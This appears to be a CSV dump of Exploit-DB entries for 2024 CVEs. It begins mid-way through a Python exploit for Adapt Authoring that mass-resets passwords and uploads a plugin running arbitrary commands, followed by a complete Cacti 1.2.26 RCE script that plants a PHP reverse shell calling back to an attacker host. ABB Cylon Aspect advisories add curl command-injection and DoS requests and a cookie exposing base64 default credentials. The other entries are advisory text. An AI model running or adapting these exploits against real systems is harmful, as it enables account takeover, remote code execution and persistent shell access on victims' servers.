f""{args.url}/api/userpasswordreset/w00tw00t"", json=data, # Multiple results returned if res.status_code == 500: next_tokens.append(token + ch) print(""[+] Reset every password to HaXX0r3d!"") def create_plugin(plugin_name): manifest = { ""name"": plugin_name, ""version"": ""1.0.0"", ""extension"": ""exploit"", ""main"": ""/js/main.js"", ""displayName"": ""exploit"", ""keywords"": [""adapt-plugin"", ""adapt-extension""], ""scripts"": {""adaptpostcopy"": ""/scripts/postcopy.js""}, property = { ""properties"": { ""pluginLocations"": { ""type"": ""object"", ""properties"": {""course"": {""type"": ""object""}}, payload = textwrap.dedent( f"""""" const {{ exec }} = require(""child_process""); module.exports = async function (fs, path, log, options, done) {{ try {{ exec(""{args.command}""); }} catch (err) {{ log(err); done(); ).strip() plugin = io.BytesIO() with zipfile.ZipFile(plugin, ""a"", zipfile.ZIP_DEFLATED, False) as zip_file: zip_file.writestr( f""{plugin_name}/bower.json"", io.BytesIO(json.dumps(manifest).encode()).getvalue(), zip_file.writestr( f""{plugin_name}/properties.schema"", io.BytesIO(json.dumps(property).encode()).getvalue(), zip_file.writestr( f""{plugin_name}/js/main.js"", io.BytesIO("""".encode()).getvalue() zip_file.writestr( f""{plugin_name}/scripts/postcopy.js"", io.BytesIO(payload.encode()).getvalue(), plugin.seek(0) return plugin def find_plugin(cookies, plugin_type, plugin_name): res = requests.get(f""{args.url}/api/{plugin_type}type"", cookies=cookies) for plugin in json.loads(res.text): if plugin[""name""] == plugin_name: return plugin[""_id""] return None def create_course(cookies): data = {} res = requests.post(f""{args.url}/api/content/course"", cookies=cookies, json=data) course_id = json.loads(res.text)[""_id""] data = {""_courseId"": course_id, ""_parentId"": course_id} res = requests.post( f""{args.url}/api/content/contentobject"", cookies=cookies, json=data, content_id = json.loads(res.text)[""_id""] data = {""_courseId"": course_id, ""_parentId"": content_id} res = requests.post(f""{args.url}/api/content/article"", cookies=cookies, json=data) article_id = json.loads(res.text)[""_id""] data = {""_courseId"": course_id, ""_parentId"": article_id} res = requests.post(f""{args.url}/api/content/block"", cookies=cookies, json=data) block_id = json.loads(res.text)[""_id""] component_id = find_plugin(cookies, ""component"", ""adapt-contrib-text"") data = { ""_courseId"": course_id, ""_parentId"": block_id, ""_component"": ""text"", ""_componentType"": component_id, requests.post(f""{args.url}/api/content/component"", cookies=cookies, json=data) return course_id def rce(users): session_cookie = None for user in users: if user[""role""] == ""Super Admin"": session_cookie = get_session_cookie(user[""email""], ""HaXX0r3d!"") break if session_cookie is None: print(""[-] Failed to login as Super Account"") sys.exit() plugin_name = ""adapt-contrib-xapi"" print(f""[+] Create malicious plugin : {plugin_name}"") plugin = create_plugin(plugin_name) print(""[+] Scan installed plugins"") plugin_id = find_plugin(session_cookie, ""extension"", plugin_name) if plugin_id is None: print(f""[+] {plugin_name} not found"") else: print(f""[+] Found {plugin_name}"") print(f""[+] Remove {plugin_name}"") requests.delete( f""{args.url}/api/extensiontype/{plugin_id}"", cookies=session_cookie, print(""[+] Upload plugin"") files = {""file"": (f""{plugin_name}.zip"", plugin, ""application/zip"")} requests.post( f""{args.url}/api/upload/contentplugin"", cookies=session_cookie, files=files, print(""[+] Find uploaded plugin"") plugin_id = find_plugin(session_cookie, ""extension"", plugin_name) if plugin_id is None: print(f""[-] {plugin_name} not found"") sys.exit() print(f""[+] Plugin ID : {plugin_id}"") print(""[+] Add plugin to new courses"") data = {""_isAddedByDefault"": True} requests.put( f""{args.url}/api/extensiontype/{plugin_id}"", cookies=session_cookie, json=data, print(""[+] Create a new course"") course_id = create_course(session_cookie) print(""[+] Build course"") res = requests.get( f""{args.url}/api/output/adapt/preview/{course_id}"", cookies=session_cookie, if res.status_code == 200: print(""[+] Command execution succeeded"") else: print(""[-] Command execution failed"") print(""[+] Remove course"") requests.delete( f""{args.url}/api/content/course/{course_id}"", cookies=session_cookie, def main(): print(""[*] Retrieve user information"") users = get_users() print(""\n[*] Reset password"") reset_password(users) print(""\n[*] Perform remote code execution"") rce(users) if __name__ == ""__main__"": parser = argparse.ArgumentParser() parser.add_argument( ""-u"", dest=""url"", help=""Site URL (e.g. www.adaptlearning.org)"", type=str, required=True, parser.add_argument( ""-U"", dest=""username"", help=""Username to authenticate as"", type=str, required=True, parser.add_argument( ""-P"", dest=""password"", help=""Password for the specified username"", type=str, required=True, parser.add_argument( ""-c"", dest=""command"", help=""Command to execute (e.g. touch /tmp/pwned)"", type=str, default=""touch /tmp/pwned"", args = parser.parse_args() main()"
CVE-2024-41947,2025-04-15,exploit db,"# Exploit Title: OpenCMS 17.0 - Stored Cross Site Scripting (XSS) # Date: 24-11-2024 # Exploit Author: Siddhartha Naik # Vendor Homepage: http://www.opencms.org/en/ # Software Link: http://www.opencms.org/en/modules/downloads/begindownload.html?id=dade528f-ec17-11ee-ab97-7fde8b0295e1 # Affected Version: 17.0 # Category: WebApps # Tested on: Windows 11 # CVE : CVE-2024-41447 1. Vendor Description: OpenCms from Alkacon Software is a professional, easy to use website content management system. OpenCms helps content managers worldwide to create and maintain beautiful websites fast and efficiently. 2. Technical Description: This is a Stored XSS vulnerability in the author field seen when publishing an article. This vulnerability has been tested on latest versions of Brave and Firefox browsers. It is believed to affect any user who clicks on the ""Read More"" button of the affected article and can be exploited by any user who is able to modify/create articles. 3. Proof Of Concept: a) Start by creating a new article. In the author field write your script like so: b) Save and publish the article c) The user who clicks on the read more button gets a popup saying '1' 4. Solution: Upgrade to latest release. http://www.opencms.org/en/home/news.html 5. Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-41447 https://github.com/Sidd545-cr/CVE/blob/main/CVE-2024-41447%20-%20Stored%20XSS%20in%20author%20field.pdf http://alkacon.com http://opencms.com"
CVE-2024-51464,2025-04-15,exploit db,"# Author Title: John Page (aka hyp3rlinx) # Author Website: hyp3rlinx.altervista.org # Source: https://hyp3rlinx.altervista.org/advisories/IBMi_Navigator_HTTP_Security_Token_Bypass-CVE-2024-51464.txt # Vendor: www.ibm.com [Product] Navigator for i is a Web console interface where you can perform the key tasks to administer your IBM i. IBM Navigator for i supports the vast majority of tasks that were available in the System i Navigator Windows client application. This Web application is part of the base IBM i operating system, and can be easily accessed from your web browser. [Vulnerability Type] HTTP Security Token Bypass [CVE Reference] CVE-2024-51464 [Security Issue] IBM i is vulnerable to bypassing Navigator for i interface restrictions. By sending a specially crafted request, an authenticated attacker could exploit this vulnerability to remotely perform operations that the user is not allowed to perform when using Navigator for i. The web application generates an HTTP security token ID called ""Mn:"" with a 19 digit value and is set in the HTTP session response header per user. Navigator, uses this token for integrity purpose to protect against arbitrary and or malicious HTTP requests. Therefore, upon receipt of a bogus security token in an HTTP request the server will respond with HTTP 403 Forbidden message. However, attackers can modify existing tokens to bypass the 403 Forbidden directive to achieve their objectives. Problem is Navigator security token logic does not properly create or detect if a security token is valid or if it has been tampered with. Attackers can manipulate the last eight digits of a token by setting them to all 0000s (zeroes) and or increment them by one, token length must be the same. This can trick the application into processing attacker controlled security tokens as the server thinks it is valid, this undermines the security of this protection. E.g. Valid HTTP header generated by the server. Mn: 6844795211344371559 Content-Length: 290 Origin: https://10.1.1.4:2003 Example of a bogus but honored MN header token set by an attacker, padded with zeros and happily accepted by the backend servlet. Mn: 6844795211300000000 The MN token is generated in the ""initProtectionSetting"" java method. public void initProtectionSetting(HttpServletRequest request, HttpServletResponse response) { initEncryption(); initSession(); [ REDACTED ] setMagicNumber(magicNumber); response.setHeader(""MN"", magicNumber + """"); setUserAgent(request.getHeader(""User-Agent"")); In the (doFilter) Method we see the check for MN header which sends HTTP 403 on invalid tokens. String mnStr = hRequest.getHeader(""MN""); if (mnStr == null) mnStr = hRequest.getParameter(""MN""); if (!isMnMatched(mnStr, hSession)) { NavLogger.severe(""Forbidden. Incorrect HTTP ID""); NavLogger.info(""Request URI: "" + requestURI); hResponse.sendError(403); return; Invalid token response will return: Error 403: SRVE38895F: Error reported: 403 Attacker increments MN or pad with zeros and requests are accepted and the token succeeds. HTTP 200 OK [References] ADV0142855 https://www.ibm.com/support/pages/node/7179509 IBM classified as ""CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax"". To be clear HTTP headers are just the delivery method for sending attacker controlled tokens to bypass Navigator protection. [Exploit/"
CVE-2024-51463,2025-04-15,exploit db,"# Author Title: John Page (aka hyp3rlinx) # Author Website: hyp3rlinx.altervista.org # Source: https://hyp3rlinx.altervista.org/advisories/IBMi_Navigator_HTTP_Security_Token_Bypass-CVE-2024-51464.txt # Vendor: www.ibm.com [Vendor] www.ibm.com [Product] Navigator for i is a Web console interface where you can perform the key tasks to administer your IBM i. IBM Navigator for i supports the vast majority of tasks that were available in the System i Navigator Windows client application. This Web application is part of the base IBM i operating system, and can be easily accessed from your web browser. [Vulnerability Type] Server Side Request Forgery (SSRF) [CVE Reference] CVE-2024-51463 [Security Issue] IBM i is vulnerable to server-side request forgery (SSRF). This may allow an authenticated attacker to send unauthorized requests from the system, potentially leading to network enumeration or facilitating other attacks. post auth server side request forgery on non managed nodes to external hosts on any TCP ports. There are two call vectors that can be abused here, one is the ""Test TLS connection"" but it only allows connections to TCP port 9476. However, there exists another servlet method called ""testConnectPort"" which an authenticated attacker can use to connect to any IP and PORT outside of the LAN. This can be abused for port scans, information disclosure, exfil data., bypass firewall rules to attack non managed nodes or connect to attacker controlled C2 infrastructure. This SSRF relies on exploiting a HTTP servlet generated security token bypass CVE-2024-51464, where intercepted HTTP request MN tokens are incremented or padded with zero. This attacker controlled MN token is now seen as valid and the HTTP 403 Forbidden restriction is bypassed. [Exploit/"
CVE-2024-25641,2025-04-15,exploit db,"# Exploit Title: Cacti 1.2.26 - Remote Code Execution (RCE) (Authenticated) # Date: 06/01/2025 # Exploit Author: D3Ext # Vendor Homepage: https://cacti.net/ # Software Link: https://github.com/Cacti/cacti/archive/refs/tags/release/1.2.26.zip # Version: 1.2.26 # Tested on: Kali Linux 2024 # CVE: CVE-2024-25641 #!/usr/bin/python3 import os import requests import base64 import gzip import time import argparse import string import random from bs4 import BeautifulSoup from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.asymmetric import padding, rsa from cryptography.hazmat.primitives import serialization def get_random_string(length): letters = string.ascii_lowercase result_str = ''.join(random.choice(letters) for i in range(length)) return result_str def check_version(url_to_check): r = requests.get(url_to_check) response = r.text if ""Cacti CHANGELOG"" in response and ""1.2.26"" in response and ""1.2.27"" not in response: print(""[+] Version seems to be 1.2.26"") else: print(""[-] Version doesn't seem to be 1.2.26, proceeding anyway"") # Main function if __name__ == '__main__': p = argparse.ArgumentParser(description=""CVE-2024-25641 - Cacti 1.2.26 Authenticated RCE"") p.add_argument('--url', help=""URL of the Cacti web root"", required=True) p.add_argument('--user', help=""username to log in"", required=True) p.add_argument('--password', help=""password of the username"", required=True) p.add_argument('--lhost', help=""local host to receive the reverse shell"", required=True) p.add_argument('--lport', help=""local port to receive the reverse shell"", required=True) p.add_argument('--verbose', help=""enable verbose"", action='store_true', default=False, required=False) # Parse CLI arguments parser = p.parse_args() url = parser.url username = parser.user password = parser.password lhost = parser.lhost lport = parser.lport verbose = parser.verbose url = url.rstrip(""/"") print(""CVE-2024-25641 - Cacti 1.2.26 Authenticated RCE\n"") # check if versions match print(""[*] Checking Cacti version..."") time.sleep(0.5) check = check_version(url + ""/CHANGELOG"") if check == False: sys.exit(0) req = requests.Session() if verbose: print(""[*] Capturing CSRF token..."") r = req.get(url) # extract CSRF token soup = BeautifulSoup(r.text, 'html.parser') html_parser = soup.find('input', {'name': '__csrf_magic'}) csrf_token = html_parser.get('value') if verbose: print(""[+] CSRF token: "" + csrf_token) print(""[*] Logging in on "" + url + ""/index.php"") # define login post data login_data = { '__csrf_magic': csrf_token, 'action': 'login', 'login_username': username, 'login_password': password, 'remember_me': 'on' # send login request r = req.post(url + ""/index.php"", data=login_data) # check success if 'Logged in' in r.text: print(""[+] Successfully logged in as "" + username) else: print(""[-] An error has ocurred while logging in as "" + username) sys.exit(0) # generate random filename random_name = get_random_string(10) random_filename = random_name + "".php"" payload = """""" array(""pipe"", ""r""), // stdin is a pipe that the child will read from 1 => array(""pipe"", ""w""), // stdout is a pipe that the child will write to 2 => array(""pipe"", ""w"") // stderr is a pipe that the child will write to $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(""ERROR: Can't spawn shell""); exit(1); stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(""Successfully opened reverse shell to $ip:$port""); while (1) { if (feof($sock)) { printit(""ERROR: Shell connection terminated""); break; if (feof($pipes[1])) { printit(""ERROR: Shell process terminated""); break; $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(""SOCK READ""); $input = fread($sock, $chunk_size); if ($debug) printit(""SOCK: $input""); fwrite($pipes[0], $input); if (in_array($pipes[1], $read_a)) { if ($debug) printit(""STDOUT READ""); $input = fread($pipes[1], $chunk_size); if ($debug) printit(""STDOUT: $input""); fwrite($sock, $input); if (in_array($pipes[2], $read_a)) { if ($debug) printit(""STDERR READ""); $input = fread($pipes[2], $chunk_size); if ($debug) printit(""STDERR: $input""); fwrite($sock, $input); fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print ""$string\n""; # generate payload print(""[*] Generating malicious payload..."") keypair = rsa.generate_private_key(public_exponent=65537, key_size=2048) public_key = keypair.public_key().public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) file_signature = keypair.sign(payload.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256()) b64_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8') b64_file_signature = base64.b64encode(file_signature).decode('utf-8') b64_public_key = base64.b64encode(public_key).decode('utf-8') data = """""" resource/"""""" + random_filename + """""" """""" + b64_payload + """""" """""" + b64_file_signature + """""" """""" + b64_public_key + """""" """""" signature = keypair.sign(data.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256()) final_data = data.replace("" "", "" "" + base64.b64encode(signature).decode('utf-8') + "" "").encode('utf-8') # write gzip data f = open(random_filename + "".gz"", ""wb"") f.write(gzip.compress(final_data)) f.close() print(""[+] Malicious GZIP: "" + random_filename + "".gz"") # define post data post_data = { '__csrf_magic': csrf_token, 'trust_signer': 'on', 'save_component_import': 1, 'action': 'save' # upload file print(""[*] Uploading GZIP file..."") # send post request r = req.post(url + ""/package_import.php?package_location=0&preview_only=on&remove_orphans=on&replace_svalues=on"", data=post_data, files={'import_file': open(random_filename + "".gz"", 'rb')}) print(""[+] Successfully uploaded GZIP file"") time.sleep(0.5) print(""[*] Validating success..."") soup = BeautifulSoup(r.text, 'html.parser') html_parser = soup.find('input', {'title': ""/var/www/html/cacti/resource/"" + random_filename}) file_id = html_parser.get('id') post_data = { '__csrf_magic': csrf_token, 'trust_signer': 'on', 'data_source_profile': 1, 'remove_orphans': 'on', 'replace_svalues': 'on', file_id: 'on', 'save_component_import': 1, 'preview_only': '', 'action': 'save', r = req.post(url + ""/package_import.php?header=false"", data=post_data) print(""[+] Success!"") time.sleep(0.5) print(""[*] Triggering reverse shell by sending GET request to "" + url + ""/resource/"" + random_filename) time.sleep(0.2) print(""[+] Check your netcat listener"") # remove payload file os.remove(random_filename + "".gz"") r = req.get(url + ""/resource/"" + random_filename)"
CVE-2024-6516,2025-04-15,exploit db,"ABB Cylon Aspect 3.08.02 (licenseServerUpdate.php) Stored Cross-Site Scripting Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB BMS/BAS controller suffers from an authenticated stored cross-site scripting vulnerability. Input passed to the 'host' POST parameter is not properly sanitised before being returned to the user. This can be exploited to execute arbitrary HTML/JS code in a user's browser session in context of an affected site. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2025-5906 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5906.php CVE ID: CVE-2024-6516 CVE URL: CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-6516 21.04.2024 P R O J E C T"
CVE-2024-6516,2025-04-15,exploit db,"ABB Cylon Aspect 3.08.02 (licenseUpload.php) Stored Cross-Site Scripting Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB Cylon Aspect BMS/BAS controller suffers from an authenticated stored cross-site scripting (XSS) vulnerability. This can be exploited by uploading a malicious .txt file containing an XSS payload, which is stored on the server and served back to users. Although the filename is sanitized via the filename POST parameter, the file contents are not inspected or sanitized, allowing attackers to inject arbitrary client-side scripts that execute in the context of any user accessing the infected file or related web page (license.php). To bypass file upload checks, the request must include the Variant string enabling the upload process for potential exploitation. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2025-5905 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5905.php CVE ID: CVE-2024-6516 CVE URL: CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-6516 21.04.2024 P R O J E C T"
CVE-2024-48839,2025-04-15,exploit db,"ABB Cylon Aspect 3.08.02 (uploadDb.php) - Remote Code Execution Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB Cylon Aspect BMS/BAS controller suffers from an authenticated OS command injection vulnerability. This can be exploited to inject and execute arbitrary shell commands through the contents of an uploaded .db file, which is passed to the copyFile.sh script. Although the filename is sanitized, the contents of the .db file are not, allowing attackers to inject malicious commands that are executed on the server. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2025-5904 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5904.php CVE ID: CVE-2024-48839 CVE URL: CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48839 21.04.2024 $ cat project P R O J E C T $ curl -s http://192.168.73.31/uploadDb.php \ > -H ""Cookie: PHPSESSID=xxx"" \ > -F ""userfile=@testingus.db"" $ curl http://192.168.73.31/database/testingus.db"
CVE-2024-6516,2025-04-15,exploit db,"ABB Cylon Aspect 3.08.02 (bbmdUpdate.php) - Remote Code Execution Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB Cylon Aspect BMS/BAS controller suffers from an authenticated blind command injection vulnerability. Input passed to several POST parameters is not properly sanitized when writing files, allowing attackers to execute arbitrary shell commands on the system. There is also an off-by-one error in array access that could lead to undefined behavior and potential DoS. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2025-5903 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5903.php CVE ID: CVE-2024-48839, CVE-2024-6516, CVE-2024-51550 CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48839 21.04.2024 $ cat project P R O J E C T $ curl http://192.168.73.31/bbmdUpdate.php \ > -H ""Cookie: PHPSESSID=xxx"" \ > -d ""rowCount=2&\ > ip1=192.168.1.1&\ > port1=47808&\ > hexMask1=0xFFFF&\ > remove1=0&\ > ip2=192.168.1.2&\ > port2=47809&\ > hexMask2=0xFFFF; sleep 17; #&\ > remove2=0&\ > submit=Submit $ curl http://192.168.73.31/bbmdUpdate.php \ > -H ""Cookie: PHPSESSID=xxx"" \ > -d ""rowCountNAT=2&\ > NATip1=192.168.1.1&\ > NATport1=2222&\ > NAThexMask1=0xFFFF&\ > NATremove1=7&\ > NATip2=192.168.1.2&\ > NATport2=2223&\ > NAThexMask2=0xFFFF; sleep 17; #&\ > NATremove2=0&\ > submit=Submit"
CVE-2024-48844,2025-04-15,exploit db,"ABB Cylon Aspect 3.08.02 (escDevicesUpdate.php) Off-by-One Config Write DoS Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: A vulnerability was identified in a PHP script where an off-by-one error in array access could lead to undefined behavior and potential DoS. The issue arises in a loop that iterates over an array using a < condition, allowing access to an out-of-bounds index. This can trigger errors or unexpected behavior when processing data, potentially crashing the application. Successful exploitation of this vulnerability can lead to a crash or disruption of service, especially if the script handles large data sets. This issue can be triggered via the rowCount POST parameter in the Electronic Security Control device update script. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2025-5902 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5902.php CVE ID: CVE-2024-48844 CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48844 21.04.2024 $ cat project P R O J E C T $ curl http://192.168.73.31/escDevicesUpdate.php \ > -H ""Cookie: PHPSESSID=xxx"" \ > -d ""rowCount=2511531337&\ > escid1=192.168.1.1&\ > remove1=0&\ > escid2=192.168.1.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\ > remove2=0&\ > etc. > etc. $ cat escDevicesUpdate.php $ini = INI::read($comproperties); unset($ini['comm']['esc-ip-addr']); $rowCount = $_POST['rowCount']; for ($i = 1; $i < $rowCount; $i++) { $fieldEscid = ""escid"" . $i; $fieldRemove = ""remove"" . $i; if ($_POST[$fieldRemove] != 1) { $escid = trim($_POST[$fieldEscid]); $ini['comm']['esc-ip-addr'][$i] = $escid; if (!INI::write($comproperties, $ini)) { logWarning(""ESC device listt modification FAILED""); $myLine = __LINE__; errorCall($myLine);"
CVE-2024-48845,2025-04-15,exploit db,"ABB Cylon Aspect 3.07.02 (userManagement.php) - Weak Password Policy Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.07.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB BMS/BAS controller suffers from a weak password policy, allowing users to set overly simplistic or blank passwords and usernames without restrictions. This vulnerability significantly reduces account security, enabling attackers to exploit weak credentials for unauthorized access to the system. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2024-5898 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5898.php CVE ID: CVE-2024-48845 CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48845 21.04.2024 P R O J E C T"
CVE-2024-51546,2025-04-15,exploit db,"ABB Cylon Aspect 3.08.02 - Cookie User Password Disclosure Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The application suffers from cleartext transmission and storage of sensitive information in a Cookie. This includes the globals parameter, where authdata contains base64-encoded credentials. A remote attacker can intercept the HTTP Cookie, including authentication credentials, through a man-in-the-middle attack, potentially compromising user accounts and sensitive data. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2025-5895 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5895.php CVE ID: CVE-2024-51546 CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-51546 21.04.2024 $ cat project P R O J E C T Cookie: PHPSESSID=xxx; context1=xxx; globals={""currentUser"":{""username"":""aamuser"",""authdata"":""YWFtdXNlcjpkZWZhdWx0"",""mangledAuth"":""bXVidmZnO2Vmc3Z0Ym45YjczMzY2ODo6MjQyODQ7Mg=="",""loginExpirySeconds"":0},""loggedIn"":true,""lang"":""en""}; cod=5.27; connect.sid=xxx; csd=44"
